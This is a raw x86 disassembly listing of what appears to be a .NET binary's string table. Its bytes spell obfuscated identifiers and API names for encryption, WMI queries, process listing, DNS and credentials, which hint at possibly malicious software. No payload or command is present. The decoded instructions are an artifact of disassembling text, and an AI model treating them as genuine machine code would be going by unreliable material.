  408f5d:	49                   	dec    %ecx
  408f5e:	6e                   	outsb  %ds:(%esi),(%dx)
  408f5f:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f61:	00 57 52             	add    %dl,0x52(%edi)
  408f64:	51                   	push   %ecx
  408f65:	70 42                	jo     0x408fa9
  408f67:	49                   	dec    %ecx
  408f68:	58                   	pop    %eax
  408f69:	4b                   	dec    %ebx
  408f6a:	67 6a 6a             	addr16 push $0x6a
  408f6d:	68 6f 00 59 59       	push   $0x5959006f
  408f72:	77 4a                	ja     0x408fbe
  408f74:	47                   	inc    %edi
  408f75:	47                   	inc    %edi
  408f76:	43                   	inc    %ebx
  408f77:	4d                   	dec    %ebp
  408f78:	4c                   	dec    %esp
  408f79:	79 53                	jns    0x408fce
  408f7b:	71 79                	jno    0x408ff6
  408f7d:	6f                   	outsl  %ds:(%esi),(%dx)
  408f7e:	00 62 73             	add    %ah,0x73(%edx)
  408f81:	4b                   	dec    %ebx
  408f82:	67 5a                	addr16 pop %edx
  408f84:	58                   	pop    %eax
  408f85:	57                   	push   %edi
  408f86:	53                   	push   %ebx
  408f87:	41                   	inc    %ecx
  408f88:	70 00                	jo     0x408f8a
  408f8a:	54                   	push   %esp
  408f8b:	62 50 75             	bound  %edx,0x75(%eax)
  408f8e:	78 6b                	js     0x408ffb
  408f90:	72 71                	jb     0x409003
  408f92:	56                   	push   %esi
  408f93:	57                   	push   %edi
  408f94:	6d                   	insl   (%dx),%es:(%edi)
  408f95:	44                   	inc    %esp
  408f96:	70 00                	jo     0x408f98
  408f98:	4c                   	dec    %esp
  408f99:	47                   	inc    %edi
  408f9a:	49                   	dec    %ecx
  408f9b:	61                   	popa
  408f9c:	73 5a                	jae    0x408ff8
  408f9e:	50                   	push   %eax
  408f9f:	56                   	push   %esi
  408fa0:	76 54                	jbe    0x408ff6
  408fa2:	41                   	inc    %ecx
  408fa3:	6d                   	insl   (%dx),%es:(%edi)
  408fa4:	52                   	push   %edx
  408fa5:	45                   	inc    %ebp
  408fa6:	70 00                	jo     0x408fa8
  408fa8:	7a 49                	jp     0x408ff3
  408faa:	52                   	push   %edx
  408fab:	70 71                	jo     0x40901e
  408fad:	4d                   	dec    %ebp
  408fae:	78 49                	js     0x408ff9
  408fb0:	78 63                	js     0x409015
  408fb2:	45                   	inc    %ebp
  408fb3:	70 00                	jo     0x408fb5
  408fb5:	66 4e                	dec    %si
  408fb7:	75 49                	jne    0x409002
  408fb9:	51                   	push   %ecx
  408fba:	61                   	popa
  408fbb:	71 55                	jno    0x409012
  408fbd:	4c                   	dec    %esp
  408fbe:	73 52                	jae    0x409012
  408fc0:	51                   	push   %ecx
  408fc1:	4a                   	dec    %edx
  408fc2:	70 00                	jo     0x408fc4
  408fc4:	72 79                	jb     0x40903f
  408fc6:	63 64 55 67          	arpl   %esp,0x67(%ebp,%edx,2)
  408fca:	6a 56                	push   $0x56
  408fcc:	75 68                	jne    0x409036
  408fce:	78 71                	js     0x409041
  408fd0:	54                   	push   %esp
  408fd1:	70 00                	jo     0x408fd3
  408fd3:	4b                   	dec    %ebx
  408fd4:	48                   	dec    %eax
  408fd5:	77 4d                	ja     0x409024
  408fd7:	70 49                	jo     0x409022
  408fd9:	62 7a 5a             	bound  %edi,0x5a(%edx)
  408fdc:	78 56                	js     0x409034
  408fde:	70 00                	jo     0x408fe0
  408fe0:	6d                   	insl   (%dx),%es:(%edi)
  408fe1:	43                   	inc    %ebx
  408fe2:	67 4e                	addr16 dec %esi
  408fe4:	64 72 65             	fs jb  0x40904c
  408fe7:	63 4f 62             	arpl   %ecx,0x62(%edi)
  408fea:	70 00                	jo     0x408fec
  408fec:	53                   	push   %ebx
  408fed:	6c                   	insb   (%dx),%es:(%edi)
  408fee:	65 65 70 00          	gs gs jo 0x408ff2
  408ff2:	66 47                	inc    %di
  408ff4:	46                   	inc    %esi
  408ff5:	55                   	push   %ebp
  408ff6:	70 6a                	jo     0x409062
  408ff8:	4d                   	dec    %ebp
  408ff9:	55                   	push   %ebp
  408ffa:	45                   	inc    %ebp
  408ffb:	72 65                	jb     0x409062
  408ffd:	70 00                	jo     0x408fff
  408fff:	4d                   	dec    %ebp
  409000:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  409007:	74 2e                	je     0x409037
  409009:	43                   	inc    %ebx
  40900a:	53                   	push   %ebx
  40900b:	68 61 72 70 00       	push   $0x707261
  409010:	6a 76                	push   $0x76
  409012:	4f                   	dec    %edi
  409013:	74 70                	je     0x409085
  409015:	42                   	inc    %edx
  409016:	57                   	push   %edi
  409017:	6c                   	insb   (%dx),%es:(%edi)
  409018:	47                   	inc    %edi
  409019:	4a                   	dec    %edx
  40901a:	6d                   	insl   (%dx),%es:(%edi)
  40901b:	76 79                	jbe    0x409096
  40901d:	59                   	pop    %ecx
  40901e:	78 70                	js     0x409090
  409020:	00 41 54             	add    %al,0x54(%ecx)
  409023:	58                   	pop    %eax
  409024:	4a                   	dec    %edx
  409025:	64 68 66 4f 6c 72    	fs push $0x726c4f66
  40902b:	76 64                	jbe    0x409091
  40902d:	44                   	inc    %esp
  40902e:	79 4c                	jns    0x40907c
  409030:	71 00                	jno    0x409032
  409032:	53                   	push   %ebx
  409033:	70 53                	jo     0x409088
  409035:	42                   	inc    %edx
  409036:	43                   	inc    %ebx
  409037:	52                   	push   %edx
  409038:	47                   	inc    %edi
  409039:	57                   	push   %edi
  40903a:	73 43                	jae    0x40907f
  40903c:	44                   	inc    %esp
  40903d:	4e                   	dec    %esi
  40903e:	69 71 00 53 79 73 74 	imul   $0x74737953,0x0(%ecx),%esi
  409045:	65 6d                	gs insl (%dx),%es:(%edi)
  409047:	2e 4c                	cs dec %esp
  409049:	69 6e 71 00 79 56 56 	imul   $0x56567900,0x71(%esi),%ebp
  409050:	74 64                	je     0x4090b6
  409052:	57                   	push   %edi
  409053:	6c                   	insb   (%dx),%es:(%edi)
  409054:	5a                   	pop    %edx
  409055:	58                   	pop    %eax
  409056:	73 68                	jae    0x4090c0
  409058:	6d                   	insl   (%dx),%es:(%edi)
  409059:	4e                   	dec    %esi
  40905a:	6f                   	outsl  %ds:(%esi),(%dx)
  40905b:	71 00                	jno    0x40905d
  40905d:	6e                   	outsb  %ds:(%esi),(%dx)
  40905e:	61                   	popa
  40905f:	72 68                	jb     0x4090c9
  409061:	49                   	dec    %ecx
  409062:	66 4f                	dec    %di
  409064:	49                   	dec    %ecx
  409065:	50                   	push   %eax
  409066:	6c                   	insb   (%dx),%es:(%edi)
  409067:	74 57                	je     0x4090c0
  409069:	7a 41                	jp     0x4090ac
  40906b:	72 00                	jb     0x40906d
  40906d:	43                   	inc    %ebx
  40906e:	6c                   	insb   (%dx),%es:(%edi)
  40906f:	65 61                	gs popa
  409071:	72 00                	jb     0x409073
  409073:	43                   	inc    %ebx
  409074:	68 61 72 00 42       	push   $0x42007261
  409079:	57                   	push   %edi
  40907a:	53                   	push   %ebx
  40907b:	70 55                	jo     0x4090d2
  40907d:	67 72 70             	addr16 jb 0x4090f0
  409080:	62 72 00             	bound  %esi,0x0(%edx)
  409083:	49                   	dec    %ecx
  409084:	6e                   	outsb  %ds:(%esi),(%dx)
  409085:	76 6f                	jbe    0x4090f6
  409087:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  40908b:	6d                   	insl   (%dx),%es:(%edi)
  40908c:	62 65 72             	bound  %esp,0x72(%ebp)
  40908f:	00 4d 44             	add    %cl,0x44(%ebp)
  409092:	35 43 72 79 70       	xor    $0x70797243,%eax
  409097:	74 6f                	je     0x409108
  409099:	53                   	push   %ebx
  40909a:	65 72 76             	gs jb  0x409113
  40909d:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  4090a4:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  4090ab:	41 
  4090ac:	43                   	inc    %ebx
  4090ad:	72 79                	jb     0x409128
  4090af:	70 74                	jo     0x409125
  4090b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4090b2:	53                   	push   %ebx
  4090b3:	65 72 76             	gs jb  0x40912c
  4090b6:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  4090bd:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  4090c4:	73 
  4090c5:	43                   	inc    %ebx
  4090c6:	72 79                	jb     0x409141
  4090c8:	70 74                	jo     0x40913e
  4090ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4090cb:	53                   	push   %ebx
  4090cc:	65 72 76             	gs jb  0x409145
  4090cf:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  4090d6:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  4090dd:	72 
  4090de:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  4090e5:	64 65 72 00          	fs gs jb 0x4090e9
  4090e9:	4d                   	dec    %ebp
  4090ea:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4090f1:	74 2e                	je     0x409121
  4090f3:	43                   	inc    %ebx
  4090f4:	53                   	push   %ebx
  4090f5:	68 61 72 70 2e       	push   $0x2e707261
  4090fa:	52                   	push   %edx
  4090fb:	75 6e                	jne    0x40916b
  4090fd:	74 69                	je     0x409168
  4090ff:	6d                   	insl   (%dx),%es:(%edi)
  409100:	65 42                	gs inc %edx
  409102:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  409109:	61                   	popa
  40910a:	6c                   	insb   (%dx),%es:(%edi)
  40910b:	6c                   	insb   (%dx),%es:(%edi)
  40910c:	53                   	push   %ebx
  40910d:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  409114:	65 
  409115:	72 00                	jb     0x409117
  409117:	67 65 74 5f          	addr16 gs je 0x40917a
  40911b:	42                   	inc    %edx
  40911c:	75 66                	jne    0x409184
  40911e:	66 65 72 00          	data16 gs jb 0x409122
  409122:	73 65                	jae    0x409189
  409124:	74 5f                	je     0x409185
  409126:	42                   	inc    %edx
  409127:	75 66                	jne    0x40918f
  409129:	66 65 72 00          	data16 gs jb 0x40912d
  40912d:	67 65 74 5f          	addr16 gs je 0x409190
  409131:	41                   	inc    %ecx
  409132:	73 49                	jae    0x40917d
  409134:	6e                   	outsb  %ds:(%esi),(%dx)
  409135:	74 65                	je     0x40919c
  409137:	67 65 72 00          	addr16 gs jb 0x40913b
  40913b:	73 65                	jae    0x4091a2
  40913d:	74 5f                	je     0x40919e
  40913f:	41                   	inc    %ecx
  409140:	73 49                	jae    0x40918b
  409142:	6e                   	outsb  %ds:(%esi),(%dx)
  409143:	74 65                	je     0x4091aa
  409145:	67 65 72 00          	addr16 gs jb 0x409149
  409149:	4d                   	dec    %ebp
  40914a:	61                   	popa
  40914b:	6e                   	outsb  %ds:(%esi),(%dx)
  40914c:	61                   	popa
  40914d:	67 65 6d             	gs insl (%dx),%es:(%di)
  409150:	65 6e                	outsb  %gs:(%esi),(%dx)
  409152:	74 4f                	je     0x4091a3
  409154:	62 6a 65             	bound  %ebp,0x65(%edx)
  409157:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  40915b:	61                   	popa
  40915c:	72 63                	jb     0x4091c1
  40915e:	68 65 72 00 53       	push   $0x53007265
  409163:	65 73 73             	gs jae 0x4091d9
  409166:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  40916d:	6e                   	outsb  %ds:(%esi),(%dx)
  40916e:	67 45                	addr16 inc %ebp
  409170:	76 65                	jbe    0x4091d7
  409172:	6e                   	outsb  %ds:(%esi),(%dx)
  409173:	74 48                	je     0x4091bd
  409175:	61                   	popa
  409176:	6e                   	outsb  %ds:(%esi),(%dx)
  409177:	64 6c                	fs insb (%dx),%es:(%edi)
  409179:	65 72 00             	gs jb  0x40917c
  40917c:	54                   	push   %esp
  40917d:	69 6d 65 72 00 54 6f 	imul   $0x6f540072,0x65(%ebp),%ebp
  409184:	55                   	push   %ebp
  409185:	70 70                	jo     0x4091f7
  409187:	65 72 00             	gs jb  0x40918a
  40918a:	43                   	inc    %ebx
  40918b:	75 72                	jne    0x4091ff
  40918d:	72 65                	jb     0x4091f4
  40918f:	6e                   	outsb  %ds:(%esi),(%dx)
  409190:	74 55                	je     0x4091e7
  409192:	73 65                	jae    0x4091f9
  409194:	72 00                	jb     0x409196
  409196:	53                   	push   %ebx
  409197:	74 72                	je     0x40920b
  409199:	65 61                	gs popa
  40919b:	6d                   	insl   (%dx),%es:(%edi)
  40919c:	57                   	push   %edi
  40919d:	72 69                	jb     0x409208
  40919f:	74 65                	je     0x409206
  4091a1:	72 00                	jb     0x4091a3
  4091a3:	54                   	push   %esp
  4091a4:	65 78 74             	gs js  0x40921b
  4091a7:	57                   	push   %edi
  4091a8:	72 69                	jb     0x409213
  4091aa:	74 65                	je     0x409211
  4091ac:	72 00                	jb     0x4091ae
  4091ae:	45                   	inc    %ebp
  4091af:	6e                   	outsb  %ds:(%esi),(%dx)
  4091b0:	74 65                	je     0x409217
  4091b2:	72 00                	jb     0x4091b4
  4091b4:	42                   	inc    %edx
  4091b5:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  4091bc:	72 
  4091bd:	74 65                	je     0x409224
  4091bf:	72 00                	jb     0x4091c1
  4091c1:	54                   	push   %esp
  4091c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4091c3:	4c                   	dec    %esp
  4091c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4091c5:	77 65                	ja     0x40922c
  4091c7:	72 00                	jb     0x4091c9
  4091c9:	49                   	dec    %ecx
  4091ca:	45                   	inc    %ebp
  4091cb:	6e                   	outsb  %ds:(%esi),(%dx)
  4091cc:	75 6d                	jne    0x40923b
  4091ce:	65 72 61             	gs jb  0x409232
  4091d1:	74 6f                	je     0x409242
  4091d3:	72 00                	jb     0x4091d5
  4091d5:	4d                   	dec    %ebp
  4091d6:	61                   	popa
  4091d7:	6e                   	outsb  %ds:(%esi),(%dx)
  4091d8:	61                   	popa
  4091d9:	67 65 6d             	gs insl (%dx),%es:(%di)
  4091dc:	65 6e                	outsb  %gs:(%esi),(%dx)
  4091de:	74 4f                	je     0x40922f
  4091e0:	62 6a 65             	bound  %ebp,0x65(%edx)
  4091e3:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  4091e7:	75 6d                	jne    0x409256
  4091e9:	65 72 61             	gs jb  0x40924d
  4091ec:	74 6f                	je     0x40925d
  4091ee:	72 00                	jb     0x4091f0
  4091f0:	53                   	push   %ebx
  4091f1:	79 73                	jns    0x409266
  4091f3:	74 65                	je     0x40925a
  4091f5:	6d                   	insl   (%dx),%es:(%edi)
  4091f6:	2e 43                	cs inc %ebx
  4091f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4091f9:	6c                   	insb   (%dx),%es:(%edi)
  4091fa:	6c                   	insb   (%dx),%es:(%edi)
  4091fb:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409200:	6e                   	outsb  %ds:(%esi),(%dx)
  409201:	73 2e                	jae    0x409231
  409203:	49                   	dec    %ecx
  409204:	45                   	inc    %ebp
  409205:	6e                   	outsb  %ds:(%esi),(%dx)
  409206:	75 6d                	jne    0x409275
  409208:	65 72 61             	gs jb  0x40926c
  40920b:	62 6c 65 2e          	bound  %ebp,0x2e(%ebp,%eiz,2)
  40920f:	47                   	inc    %edi
  409210:	65 74 45             	gs je  0x409258
  409213:	6e                   	outsb  %ds:(%esi),(%dx)
  409214:	75 6d                	jne    0x409283
  409216:	65 72 61             	gs jb  0x40927a
  409219:	74 6f                	je     0x40928a
  40921b:	72 00                	jb     0x40921d
  40921d:	41                   	inc    %ecx
  40921e:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  409222:	61                   	popa
  409223:	74 6f                	je     0x409294
  409225:	72 00                	jb     0x409227
  409227:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  40922c:	00 2e                	add    %ch,(%esi)
  40922e:	63 63 74             	arpl   %esp,0x74(%ebx)
  409231:	6f                   	outsl  %ds:(%esi),(%dx)
  409232:	72 00                	jb     0x409234
  409234:	4d                   	dec    %ebp
  409235:	6f                   	outsl  %ds:(%esi),(%dx)
  409236:	6e                   	outsb  %ds:(%esi),(%dx)
  409237:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  40923e:	65 
  40923f:	61                   	popa
  409240:	74 65                	je     0x4092a7
  409242:	44                   	inc    %esp
  409243:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  409247:	70 74                	jo     0x4092bd
  409249:	6f                   	outsl  %ds:(%esi),(%dx)
  40924a:	72 00                	jb     0x40924c
  40924c:	43                   	inc    %ebx
  40924d:	72 65                	jb     0x4092b4
  40924f:	61                   	popa
  409250:	74 65                	je     0x4092b7
  409252:	45                   	inc    %ebp
  409253:	6e                   	outsb  %ds:(%esi),(%dx)
  409254:	63 72 79             	arpl   %esi,0x79(%edx)
  409257:	70 74                	jo     0x4092cd
  409259:	6f                   	outsl  %ds:(%esi),(%dx)
  40925a:	72 00                	jb     0x40925c
  40925c:	49                   	dec    %ecx
  40925d:	6e                   	outsb  %ds:(%esi),(%dx)
  40925e:	74 50                	je     0x4092b0
  409260:	74 72                	je     0x4092d4
  409262:	00 74 7a 78          	add    %dh,0x78(%edx,%edi,2)
  409266:	66 4d                	dec    %bp
  409268:	71 74                	jno    0x4092de
  40926a:	51                   	push   %ecx
  40926b:	78 72                	js     0x4092df
  40926d:	00 62 79             	add    %ah,0x79(%edx)
  409270:	78 47                	js     0x4092b9
  409272:	57                   	push   %edi
  409273:	58                   	pop    %eax
  409274:	55                   	push   %ebp
  409275:	5a                   	pop    %edx
  409276:	54                   	push   %esp
  409277:	45                   	inc    %ebp
  409278:	73 00                	jae    0x40927a
  40927a:	45                   	inc    %ebp
  40927b:	55                   	push   %ebp
  40927c:	48                   	dec    %eax
  40927d:	52                   	push   %edx
  40927e:	71 49                	jno    0x4092c9
  409280:	6f                   	outsl  %ds:(%esi),(%dx)
  409281:	61                   	popa
  409282:	66 47                	inc    %di
  409284:	73 00                	jae    0x409286
  409286:	7a 65                	jp     0x4092ed
  409288:	69 69 55 44 46 72 64 	imul   $0x64724644,0x55(%ecx),%ebp
  40928f:	49                   	dec    %ecx
  409290:	4e                   	dec    %esi
  409291:	75 49                	jne    0x4092dc
  409293:	73 00                	jae    0x409295
  409295:	56                   	push   %esi
  409296:	61                   	popa
  409297:	6b 6d 6b 58          	imul   $0x58,0x6b(%ebp),%ebp
  40929b:	63 64 4b 46          	arpl   %esp,0x46(%ebx,%ecx,2)
  40929f:	4c                   	dec    %esp
  4092a0:	73 00                	jae    0x4092a2
  4092a2:	7a 57                	jp     0x4092fb
  4092a4:	49                   	dec    %ecx
  4092a5:	65 76 62             	gs jbe 0x40930a
  4092a8:	64 54                	fs push %esp
  4092aa:	4c                   	dec    %esp
  4092ab:	73 00                	jae    0x4092ad
  4092ad:	41                   	inc    %ecx
  4092ae:	63 52 72             	arpl   %edx,0x72(%edx)
  4092b1:	55                   	push   %ebp
  4092b2:	6a 4d                	push   $0x4d
  4092b4:	6d                   	insl   (%dx),%es:(%edi)
  4092b5:	52                   	push   %edx
  4092b6:	73 00                	jae    0x4092b8
  4092b8:	53                   	push   %ebx
  4092b9:	79 73                	jns    0x40932e
  4092bb:	74 65                	je     0x409322
  4092bd:	6d                   	insl   (%dx),%es:(%edi)
  4092be:	2e 44                	cs inc %esp
  4092c0:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  4092c7:	69 63 73 00 4d 69 63 	imul   $0x63694d00,0x73(%ebx),%esp
  4092ce:	72 6f                	jb     0x40933f
  4092d0:	73 6f                	jae    0x409341
  4092d2:	66 74 2e             	data16 je 0x409303
  4092d5:	56                   	push   %esi
  4092d6:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  4092dd:	73 69                	jae    0x409348
  4092df:	63 2e                	arpl   %ebp,(%esi)
  4092e1:	44                   	inc    %esp
  4092e2:	65 76 69             	gs jbe 0x40934e
  4092e5:	63 65 73             	arpl   %esp,0x73(%ebp)
  4092e8:	00 53 79             	add    %dl,0x79(%ebx)
  4092eb:	73 74                	jae    0x409361
  4092ed:	65 6d                	gs insl (%dx),%es:(%edi)
  4092ef:	2e 52                	cs push %edx
  4092f1:	75 6e                	jne    0x409361
  4092f3:	74 69                	je     0x40935e
  4092f5:	6d                   	insl   (%dx),%es:(%edi)
  4092f6:	65 2e 49             	gs cs dec %ecx
  4092f9:	6e                   	outsb  %ds:(%esi),(%dx)
  4092fa:	74 65                	je     0x409361
  4092fc:	72 6f                	jb     0x40936d
  4092fe:	70 53                	jo     0x409353
  409300:	65 72 76             	gs jb  0x409379
  409303:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  40930a:	73 74                	jae    0x409380
  40930c:	65 6d                	gs insl (%dx),%es:(%edi)
  40930e:	2e 52                	cs push %edx
  409310:	75 6e                	jne    0x409380
  409312:	74 69                	je     0x40937d
  409314:	6d                   	insl   (%dx),%es:(%edi)
  409315:	65 2e 43             	gs cs inc %ebx
  409318:	6f                   	outsl  %ds:(%esi),(%dx)
  409319:	6d                   	insl   (%dx),%es:(%edi)
  40931a:	70 69                	jo     0x409385
  40931c:	6c                   	insb   (%dx),%es:(%edi)
  40931d:	65 72 53             	gs jb  0x409373
  409320:	65 72 76             	gs jb  0x409399
  409323:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  40932a:	62 75 67             	bound  %esi,0x67(%ebp)
  40932d:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  409334:	65 
  409335:	73 00                	jae    0x409337
  409337:	45                   	inc    %ebp
  409338:	78 70                	js     0x4093aa
  40933a:	61                   	popa
  40933b:	6e                   	outsb  %ds:(%esi),(%dx)
  40933c:	64 45                	fs inc %ebp
  40933e:	6e                   	outsb  %ds:(%esi),(%dx)
  40933f:	76 69                	jbe    0x4093aa
  409341:	72 6f                	jb     0x4093b2
  409343:	6e                   	outsb  %ds:(%esi),(%dx)
  409344:	6d                   	insl   (%dx),%es:(%edi)
  409345:	65 6e                	outsb  %gs:(%esi),(%dx)
  409347:	74 56                	je     0x40939f
  409349:	61                   	popa
  40934a:	72 69                	jb     0x4093b5
  40934c:	61                   	popa
  40934d:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  409351:	00 47 65             	add    %al,0x65(%edi)
  409354:	74 50                	je     0x4093a6
  409356:	72 6f                	jb     0x4093c7
  409358:	63 65 73             	arpl   %esp,0x73(%ebp)
  40935b:	73 65                	jae    0x4093c2
  40935d:	73 00                	jae    0x40935f
  40935f:	47                   	inc    %edi
  409360:	65 74 48             	gs je  0x4093ab
  409363:	6f                   	outsl  %ds:(%esi),(%dx)
  409364:	73 74                	jae    0x4093da
  409366:	41                   	inc    %ecx
  409367:	64 64 72 65          	fs fs jb 0x4093d0
  40936b:	73 73                	jae    0x4093e0
  40936d:	65 73 00             	gs jae 0x409370
  409370:	53                   	push   %ebx
  409371:	79 73                	jns    0x4093e6
  409373:	74 65                	je     0x4093da
  409375:	6d                   	insl   (%dx),%es:(%edi)
  409376:	2e 53                	cs push %ebx
  409378:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40937c:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  409383:	70 
  409384:	74 6f                	je     0x4093f5
  409386:	67 72 61             	addr16 jb 0x4093ea
  409389:	70 68                	jo     0x4093f3
  40938b:	79 2e                	jns    0x4093bb
  40938d:	58                   	pop    %eax
  40938e:	35 30 39 43 65       	xor    $0x65433930,%eax
  409393:	72 74                	jb     0x409409
  409395:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40939c:	73 00                	jae    0x40939e
  40939e:	52                   	push   %edx
  40939f:	66 63 32             	arpl   %si,(%edx)
  4093a2:	38 39                	cmp    %bh,(%ecx)
  4093a4:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  4093a8:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  4093af:	73 00                	jae    0x4093b1
  4093b1:	52                   	push   %edx
  4093b2:	65 61                	gs popa
  4093b4:	64 41                	fs inc %ecx
  4093b6:	6c                   	insb   (%dx),%es:(%edi)
  4093b7:	6c                   	insb   (%dx),%es:(%edi)
  4093b8:	42                   	inc    %edx
  4093b9:	79 74                	jns    0x40942f
  4093bb:	65 73 00             	gs jae 0x4093be
  4093be:	47                   	inc    %edi
  4093bf:	65 74 42             	gs je  0x409404
  4093c2:	79 74                	jns    0x409438
  4093c4:	65 73 00             	gs jae 0x4093c7
  4093c7:	4e                   	dec    %esi
  4093c8:	65 78 74             	gs js  0x40943f
  4093cb:	42                   	inc    %edx
  4093cc:	79 74                	jns    0x409442
  4093ce:	65 73 00             	gs jae 0x4093d1
  4093d1:	43                   	inc    %ebx
  4093d2:	53                   	push   %ebx
  4093d3:	68 61 72 70 41       	push   $0x41707261
  4093d8:	72 67                	jb     0x409441
  4093da:	75 6d                	jne    0x409449
  4093dc:	65 6e                	outsb  %gs:(%esi),(%dx)
  4093de:	74 49                	je     0x409429
  4093e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4093e1:	66 6f                	outsw  %ds:(%esi),(%dx)
  4093e3:	46                   	inc    %esi
  4093e4:	6c                   	insb   (%dx),%es:(%edi)
  4093e5:	61                   	popa
  4093e6:	67 73 00             	addr16 jae 0x4093e9
  4093e9:	43                   	inc    %ebx
  4093ea:	53                   	push   %ebx
  4093eb:	68 61 72 70 42       	push   $0x42707261
  4093f0:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  4093f7:	61                   	popa
  4093f8:	67 73 00             	addr16 jae 0x4093fb
  4093fb:	53                   	push   %ebx
  4093fc:	74 72                	je     0x409470
  4093fe:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  409405:	73 73                	jae    0x40947a
  409407:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  40940e:	6e                   	outsb  %ds:(%esi),(%dx)
  40940f:	67 45                	addr16 inc %ebp
  409411:	76 65                	jbe    0x409478
  409413:	6e                   	outsb  %ds:(%esi),(%dx)
  409414:	74 41                	je     0x409457
  409416:	72 67                	jb     0x40947f
  409418:	73 00                	jae    0x40941a
  40941a:	49                   	dec    %ecx
  40941b:	43                   	inc    %ebx
  40941c:	72 65                	jb     0x409483
  40941e:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409421:	74 69                	je     0x40948c
  409423:	61                   	popa
  409424:	6c                   	insb   (%dx),%es:(%edi)
  409425:	73 00                	jae    0x409427
  409427:	73 65                	jae    0x40948e
  409429:	74 5f                	je     0x40948a
  40942b:	43                   	inc    %ebx
  40942c:	72 65                	jb     0x409493
  40942e:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409431:	74 69                	je     0x40949c
  409433:	61                   	popa
  409434:	6c                   	insb   (%dx),%es:(%edi)
  409435:	73 00                	jae    0x409437
  409437:	45                   	inc    %ebp
  409438:	71 75                	jno    0x4094af
  40943a:	61                   	popa
  40943b:	6c                   	insb   (%dx),%es:(%edi)
  40943c:	73 00                	jae    0x40943e
  40943e:	53                   	push   %ebx
  40943f:	73 6c                	jae    0x4094ad
  409441:	50                   	push   %eax
  409442:	72 6f                	jb     0x4094b3
  409444:	74 6f                	je     0x4094b5
  409446:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  409449:	73 00                	jae    0x40944b
  40944b:	72 44                	jb     0x409491
  40944d:	54                   	push   %esp
  40944e:	42                   	inc    %edx
  40944f:	64 6a 78             	fs push $0x78
  409452:	62 74 4e 70          	bound  %esi,0x70(%esi,%ecx,2)
  409456:	6d                   	insl   (%dx),%es:(%edi)
  409457:	73 00                	jae    0x409459
  409459:	53                   	push   %ebx
  40945a:	79 73                	jns    0x4094cf
  40945c:	74 65                	je     0x4094c3
  40945e:	6d                   	insl   (%dx),%es:(%edi)
  40945f:	2e 57                	cs push %edi
  409461:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  409468:	46                   	inc    %esi
  409469:	6f                   	outsl  %ds:(%esi),(%dx)
  40946a:	72 6d                	jb     0x4094d9
  40946c:	73 00                	jae    0x40946e
  40946e:	44                   	inc    %esp
  40946f:	6e                   	outsb  %ds:(%esi),(%dx)
  409470:	73 00                	jae    0x409472
  409472:	43                   	inc    %ebx
  409473:	6f                   	outsl  %ds:(%esi),(%dx)
  409474:	6e                   	outsb  %ds:(%esi),(%dx)
  409475:	74 61                	je     0x4094d8
  409477:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  40947e:	74 65                	je     0x4094e5
  409480:	6d                   	insl   (%dx),%es:(%edi)
  409481:	2e 43                	cs inc %ebx
  409483:	6f                   	outsl  %ds:(%esi),(%dx)
  409484:	6c                   	insb   (%dx),%es:(%edi)
  409485:	6c                   	insb   (%dx),%es:(%edi)
  409486:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40948b:	6e                   	outsb  %ds:(%esi),(%dx)
  40948c:	73 00                	jae    0x40948e
  40948e:	53                   	push   %ebx
